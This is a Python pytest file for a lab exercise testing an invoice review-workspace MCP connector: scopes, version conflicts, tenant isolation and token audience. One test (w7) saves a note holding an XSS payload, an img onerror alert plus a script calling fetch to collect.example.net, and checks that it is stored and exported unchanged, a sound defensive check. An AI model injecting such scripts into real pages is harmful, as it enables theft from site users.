"""The review workspace connector in Python (Lab 20b, Task 4): the same tests as servers/review-ts/test/,
with the same words. In process, with test tokens, against the dev database as review_writer. Each test
run removes the notes it wrote."""

from __future__ import annotations

import os
import re
from collections.abc import Iterator
from typing import Any

import psycopg
import pytest
from starlette.testclient import TestClient

from brightline_ap.review_db import ReviewDatabase
from brightline_ap.review_server import create_review_app
from tests.tokens import DEFAULT_JWKS, ISSUER, sign

RESOURCE = "http://127.0.0.1:8758/mcp"
AP_RESOURCE = "http://127.0.0.1:8718/mcp"
if not os.environ.get("DATABASE_URL_REVIEW_WRITER"):
    pytest.skip("DATABASE_URL_REVIEW_WRITER is not set: run npm run db:migrate and npm run db:passwords (Lab 20b, Task 1)",
                allow_module_level=True)
LINES: list[dict[str, Any]] = []


def person(sub: str, name: str, tenant: str, scope: str, aud: str = RESOURCE) -> str:
    return sign({"sub": sub, "name": name, "tenant": tenant, "scope": scope, "aud": aud})


LUIS = person("u_test_luis", "Luis Moreno", "org_cedar", "review:read review:write")
PRIYA = person("u_test_priya", "Priya Shah", "org_cedar", "review:read review:write")
MARCO = person("u_test_marco", "Marco Diaz", "org_cedar", "review:read")
ANA = person("u_test_ana", "Ana Morales", "org_brightline", "review:read review:write")


def _clean() -> None:
    with psycopg.connect(os.environ["DATABASE_URL_LOADER"]) as c:
        for tenant in ("org_cedar", "org_brightline"):
            with c.transaction():
                c.execute("SELECT set_config('app.tenant_id', %s, true)", (tenant,))
                c.execute("DELETE FROM review_notes WHERE tenant_id = %s AND saved_by LIKE 'u_test_%%'", (tenant,))


@pytest.fixture(scope="module")
def client() -> Iterator[TestClient]:
    _clean()
    app = create_review_app(issuer=ISSUER, resource=RESOURCE, db=ReviewDatabase(os.environ["DATABASE_URL_REVIEW_WRITER"]),
                            as_of="2027-03-30", jwks_url=DEFAULT_JWKS, log=LINES.append)
    with TestClient(app, base_url="http://127.0.0.1") as c:
        yield c
    _clean()


def rpc(client: TestClient, method: str, params: dict[str, Any], token: str) -> Any:
    params = {**params, "_meta": {"io.modelcontextprotocol/protocolVersion": "2026-07-28", "io.modelcontextprotocol/clientCapabilities": {}}}
    headers = {"content-type": "application/json", "accept": "application/json, text/event-stream",
               "mcp-protocol-version": "2026-07-28", "mcp-method": method, "authorization": f"Bearer {token}"}
    if method == "tools/call":
        headers["mcp-name"] = params["name"]
    elif method == "resources/read":
        headers["mcp-name"] = params["uri"]
    return client.post("/mcp", headers=headers, json={"jsonrpc": "2.0", "id": 1, "method": method, "params": params})


def call(client: TestClient, name: str, args: dict[str, Any], token: str) -> dict[str, Any]:
    response = rpc(client, "tools/call", {"name": name, "arguments": args}, token)
    assert response.status_code == 200, response.text
    return response.json()["result"]


def text(result: dict[str, Any]) -> str:
    return result["content"][0]["text"]


def test_five_tools_save_offered_to_the_page_only_and_the_page(client: TestClient) -> None:
    tools: list[dict[str, Any]] = rpc(client, "tools/list", {}, LUIS).json()["result"]["tools"]
    assert sorted(t["name"] for t in tools) == ["export_review", "get_review_note", "open_review_workspace", "review_list", "save_review_note"]

    def ui_of(tool: dict[str, Any]) -> dict[str, Any]:
        meta: dict[str, Any] = tool.get("_meta") or {}
        return meta.get("ui", {})
    ui = {str(t["name"]): ui_of(t) for t in tools}
    assert ui["open_review_workspace"]["resourceUri"] == "ui://brightline/review-workspace.html"
    assert ui["save_review_note"]["visibility"] == ["app"]
    page = rpc(client, "resources/read", {"uri": "ui://brightline/review-workspace.html"}, LUIS).json()["result"]["contents"][0]
    assert page["mimeType"] == "text/html;profile=mcp-app"
    assert not re.search(r"<script[^>]+src=", page["text"])


def test_open_review_workspace_text_answer(client: TestClient) -> None:
    r = call(client, "open_review_workspace", {}, LUIS)
    assert text(r).startswith("Cedar Ridge Supply's month-end review, as of 2027-03-30: 16 open invoices, $21,329.00 in all, 14 of them overdue.")
    assert len(r["structuredContent"]["invoices"]) == 16


def test_w1_luis_saves_version_1_and_the_audit_line_names_him(client: TestClient) -> None:
    LINES.clear()
    r = call(client, "save_review_note", {"invoice_number": "INV-6201", "note": "Matches PO-6101. Approved for payment run.", "status": "reviewed", "version": 0}, LUIS)
    assert not r.get("isError"), text(r)
    assert r["structuredContent"]["version"] == 1
    assert [(x["tool"], x["person"], x["company"], x["outcome"]) for x in LINES] == [("save_review_note", "u_test_luis", "org_cedar", "ok")]
    got = call(client, "get_review_note", {"invoice_number": "INV-6201"}, LUIS)
    assert got["structuredContent"]["note"]["saved_by_name"] == "Luis Moreno"


def test_w2_marco_is_refused_before_the_tool_runs(client: TestClient) -> None:
    response = rpc(client, "tools/call", {"name": "save_review_note", "arguments": {"invoice_number": "INV-6202", "note": "x", "status": "open", "version": 0}}, MARCO)
    assert response.status_code == 403
    assert "save_review_note needs review:read review:write. Your role in Cedar Ridge Supply does not include it." in response.headers["www-authenticate"]


def test_w3_priya_saves_on_inv_8301_not_found(client: TestClient) -> None:
    r = call(client, "save_review_note", {"invoice_number": "INV-8301", "note": "x", "status": "open", "version": 0}, PRIYA)
    assert r["isError"] is True
    assert text(r) == "Invoice INV-8301 was not found among Cedar Ridge Supply's open invoices."


def test_w4_the_second_save_of_a_version_is_refused_and_names_the_first(client: TestClient) -> None:
    first = call(client, "save_review_note", {"invoice_number": "INV-6207", "note": "Waiting on the vendor's credit note.", "status": "follow up", "version": 0}, LUIS)
    assert first["structuredContent"]["version"] == 1
    second = call(client, "save_review_note", {"invoice_number": "INV-6207", "note": "Paid in full, close it.", "status": "reviewed", "version": 0}, PRIYA)
    assert second["isError"] is True
    assert re.fullmatch(r"This note changed after you opened it: Luis Moreno saved version 1 at \d{4}-\d{2}-\d{2} \d{2}:\d{2} UTC\. "
                        r"Your text was not saved\. Reload and compare, then save again\.", text(second))


def test_w7_a_note_with_page_code_comes_back_as_the_same_characters(client: TestClient) -> None:
    planted = 'Check <img src=x onerror="alert(1)"> and <script>fetch("https://collect.example.net")</script> | pipe'
    assert not call(client, "save_review_note", {"invoice_number": "INV-6211", "note": planted, "status": "open", "version": 0}, LUIS).get("isError")
    assert call(client, "get_review_note", {"invoice_number": "INV-6211"}, LUIS)["structuredContent"]["note"]["note"] == planted
    md = text(call(client, "export_review", {}, LUIS))
    assert "| INV-6211 |" in md and "\\| pipe" in md


def test_w8_ana_sees_none_of_cedar_ridges_notes(client: TestClient) -> None:
    rows = call(client, "review_list", {}, ANA)["structuredContent"]["invoices"]
    assert len(rows) == 13
    assert all(r["saved_by_name"] is None or r["saved_by_name"] not in ("Luis Moreno", "Priya Shah") for r in rows)


def test_w9_the_ap_connectors_token_is_refused_here(client: TestClient) -> None:
    ap = person("u_test_luis", "Luis Moreno", "org_cedar", "review:read review:write", AP_RESOURCE)
    response = rpc(client, "tools/list", {}, ap)
    assert response.status_code == 401
    assert "Sign in to use the Brightline review workspace." in response.headers["www-authenticate"]


def test_review_list_filters(client: TestClient) -> None:
    def ids(args: dict[str, Any]) -> list[str]:
        return [r["invoice_number"] for r in call(client, "review_list", args, LUIS)["structuredContent"]["invoices"]]
    assert len(ids({"overdue": True})) == 14
    assert ids({"vendor_id": "V102"}) == ["INV-6207", "INV-6219"]
    assert ids({"status": "reviewed"}) == ["INV-6201"]


def test_rule_3_a_company_input_is_refused(client: TestClient) -> None:
    r = call(client, "review_list", {"company": "org_brightline"}, LUIS)
    assert r["isError"] is True
    assert text(r) == "Unknown input company. The company comes only from your sign-in, never from a tool input."
